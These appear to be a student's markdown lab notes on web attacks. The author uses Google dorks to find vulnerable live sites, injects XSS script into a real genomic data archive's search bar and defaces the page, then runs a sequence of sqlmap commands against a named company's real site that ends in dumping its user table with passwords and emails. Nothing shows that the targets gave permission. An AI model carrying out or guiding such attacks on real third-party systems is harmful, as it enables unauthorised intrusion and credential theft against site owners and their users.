---
title: 'Server Side Web Application Attack - Lab # 3'
updated: 2023-05-06 17:22:31Z
created: 2023-04-28 16:50:49Z
latitude: 51.50735090
longitude: -0.12775830
altitude: 0.0000
---

## XSS
### 1. Vulnerable Website
Found the target site using this search query on Google Search Page 2,
```
		inurl:/search-results.php?search=
```

![e01968f2b11599e381eac3fbcaca9632.png](../_resources/e01968f2b11599e381eac3fbcaca9632.png)

### 2. Target Site
- **About** 
	- The European Genome-phenome Archive (EGA) is a service for permanent archiving and sharing of all types of personally identifiable genetic and phenotypic data resulting from biomedical research projects. The EGA contains exclusive data collected from individuals whose consent agreements authorise data release only for specific research use or to bona fide researchers.
- Used this link:
	-  https://ega-archive.org/

### 3. Launching Attack
## 3.1 
	
![331cfeb78e049b574ea4901ca5f4ab17.png](../_resources/331cfeb78e049b574ea4901ca5f4ab17.png)
	  - In the search bar, injected the following JS code and XSS happened
```
	<script>alert('Testing. XSS. EthicalHacking');</script>
```

![ac9c84089db04e74a33ca2018761902a.png](../_resources/ac9c84089db04e74a33ca2018761902a.png)

## 3.2 Placing Image on Site
- Distorted the site with custom image on it using the following lines of code
```

	<script>
		alert('xss. Ethical Hacking!'); 
		document.write("<img src='https://www.howtogeek.com/wp-content/uploads/2020/12/google-chrome-logo-on-a-blue-background.jpg?height=100p&trim=2,2,2,2' />");
	</script>


```

![0073bf2667999863e2927357533513eb.png](../_resources/0073bf2667999863e2927357533513eb.png)

<center>_____________________________________________________</center>

## 3.2 SQL Injection using SQLMap
- Following the video steps found the sql vulnerable site using this google dork
```sql
	inurl:/product.php?id=
```

![3b7172eba46efc76f137d80fe919ab17.png](../_resources/3b7172eba46efc76f137d80fe919ab17.png)

- Target Site Link https://www.lghk.com/product.php
	- **About Site**
		- LeachGarner is a global precious metal solution provider (A Berkshire Hathaway Company). We design, fabricate and distribute precious metal alloys, mill products and jewelry findings to a number of industries including electronics, medical, automotive, jewelry and numismatic. Headquartered in Attleboro, MA USA, LeachGarner has sales, distribution and manufacturing facilities in the US, Hong Kong and China. LeachGarner brands include General Findings, Excell Chains and Stern Metals.
### 3.2.a. Testing Site Vulnerable to Sql Injection or Not
- As described in the video, place an apostrophe at the end of the url and see if any error appears on page, if yes then site is vulnerable to attack.
```
	https://www.lghk.com/product.php?id=142&pid=4%27
```

![76ffbd65654b31d1f53d63a7df2da0f6.png](../_resources/76ffbd65654b31d1f53d63a7df2da0f6.png)

### 3.2.b Testing Site using SQLMap
- Found databases of the site using this command
```
	sqlmap -u "https://www.lghk.com/product.php?id=142&pid=4" --dbs
```

- Output of the above command
![495a2375af9ac1aff0c47ab44e5172cc.png](../_resources/495a2375af9ac1aff0c47ab44e5172cc.png)

- Fetching Tables of `leach` database as listed in the above screenshot using this command,
```
	sqlmap -u "https://www.lghk.com/product.php?id=142&pid=4" -D leach --tables

```

- Output of the above command
![e117f2a727a2401e0cb9c27f2dfe5714.png](../_resources/e117f2a727a2401e0cb9c27f2dfe5714.png)

- Fetching columns in the `usr` table of `leach` database using this command
```
	sqlmap -u "https://www.lghk.com/product.php?id=142&pid=4" -D leach -T usr --columns

```

- Output of the above command
![5582e517bd254a521b430feb04d68aec.png](../_resources/5582e517bd254a521b430feb04d68aec.png)

- Dumping users credentials using this command
```
	sqlmap -u "https://www.lghk.com/product.php?id=142&pid=4" -D leach -T usr -C "usr_id, usr_name, usr_pwd, usr_login_name, usr_email ,usr_st, usr_lv" --dump

```

![c9a6f67d9b2e447f8667c588baf19ed0.png](../_resources/c9a6f67d9b2e447f8667c588baf19ed0.png)

<center>_____________________________________________________</center>